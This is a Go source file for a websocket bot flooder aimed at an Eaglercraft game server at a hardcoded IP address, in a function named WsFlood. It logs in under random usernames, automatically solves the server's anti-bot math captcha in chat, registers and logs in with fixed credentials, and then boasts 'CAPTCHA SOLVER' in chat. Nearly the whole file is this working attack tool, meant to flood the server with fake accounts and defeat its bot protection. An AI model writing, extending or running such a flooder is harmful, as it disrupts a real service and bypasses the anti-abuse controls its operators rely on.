package main

import (
	"log"
	"math/rand"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

// var addr string = "123.56.152.69:12345"

var addr string = "43.248.189.71:2107"
var authme bool = false

func WsFlood(motd bool) {
	c, _, err := websocket.DefaultDialer.Dial("ws://"+addr+"/", nil)
	if err != nil {
		log.Println("dial:", err)
		return
	}
	closed := false
	c.SetCloseHandler(func(code int, text string) error {
		closed = true
		return nil
	})
	defer c.Close()

	if motd {
		err = c.WriteMessage(websocket.TextMessage, []byte("Accept: MOTD"))
	} else {
		err = c.WriteMessage(websocket.BinaryMessage, buildLoginPacket(RandStringRunes(5)+"T4nk", addr))
		err = c.WriteMessage(websocket.BinaryMessage, buildCustomPayload("EAG|MySkin", []byte{0x04, byte(rand.Intn(64))}))
	}
	if err != nil {
		log.Println(err)
		return
	}
	handleChat := func(msg string) {
		if len(msg) > 100 {
			return
		}
		log.Println(msg)
		if strings.Contains(msg, "等于") && strings.Contains(msg, "?") {
			log.Println(msg)
			res := solve(msg)
			go func() {
				time.Sleep(1 * time.Second)
				if closed {
					return
				}
				err := c.WriteMessage(websocket.BinaryMessage, buildChat(res))
				if err != nil {
					return
				}
				time.Sleep(3 * time.Second)
				if closed {
					return
				}
				err = c.WriteMessage(websocket.BinaryMessage, buildChat("/register 114514 114514"))
				if err != nil {
					log.Println("read:", err)
					return
				}
				err = c.WriteMessage(websocket.BinaryMessage, buildChat("/login 114514"))
				if err != nil {
					log.Println("read:", err)
					return
				}
				time.Sleep(5 * time.Second)
				if closed {
					return
				}
				err = c.WriteMessage(websocket.BinaryMessage, buildChat("CAPTCHA SOLVER => "+res))
				if err != nil {
					log.Println("read:", err)
					return
				}
			}()
		}
	}
	for true {
		_, msg, err := c.ReadMessage()
		// _, _, err := c.ReadMessage()
		if err != nil {
			log.Println("read:", err)
			return
		}
		// log.Printf("receive: id=%d len=%d\n", msg[0], len(msg))
		if msg[0] == 3 { // chat packet
			handleChat(readMessage(msg[1:]))
		} else if msg[0] == 255 { // disconnect packet
			handleDisconnect(readMessage(msg[1:]))
		}
		// if msg[0] == 250 { // custom payload packet
		// 	log.Printf("receive: id=%d msg=%s\n", msg[0], msg[3:])
		// }
		// if motd {
		// 	return
		// }
		// log.Printf("receive: %s\n", msg)
		// return
	}
}

func readMessage(msg []byte) string {
	length := readShort(msg, 0)
	res := []rune{}
	for i := 0; i < length; i++ {
		res = append(res, rune(readShort(msg, 2+i*2)))
	}
	return string(res)
}

func readShort(b []byte, p int) int {
	if p+2 > len(b) {
		return 0
	}
	return int(b[p])<<8 | int(b[p+1])
}

func handleDisconnect(msg string) {
	if strings.Contains(msg, "full") {
		return
	}
	log.Println("disconnect:", msg)
}

func buildLoginPacket(username string, server string) []byte {
	b := []byte{0x02, 69}
	b = writeString(b, username)
	b = writeString(b, server)
	b = append(b, []byte{0x00, 0x00, 0x0b, 0x3b}...)
	return b
}

func buildCustomPayload(channel string, msg []byte) []byte {
	b := []byte{0xfa}
	b = writeString(b, channel)
	b = writeShort(b, len(msg))
	b = append(b, msg...)
	return b
}

func buildClientInfo(lang string) []byte {
	b := []byte{0xcc}
	b = writeString(b, lang)
	b = append(b, []byte{0x01, 0x0b, 0x02, 0x01}...)
	return b
}

func buildChat(msg string) []byte {
	b := []byte{0x03}
	b = writeString(b, msg)
	return b
}

func buildChatAdv(msg []byte) []byte {
	b := []byte{0x03}
	b = writeShort(b, len(msg)/2)
	b = append(b, msg...)
	return b
}

func writeString(b []byte, str string) []byte {
	tmp := []byte{}
	length := 0
	for _, c := range str {
		tmp = writeShort(tmp, int(c))
		length++
	}
	b = writeShort(b, length)
	b = append(b, tmp...)
	return b
}

func writeShort(b []byte, num int) []byte {
	b = append(b, byte(num>>8&255))
	b = append(b, byte(num>>0&255))
	return b
}
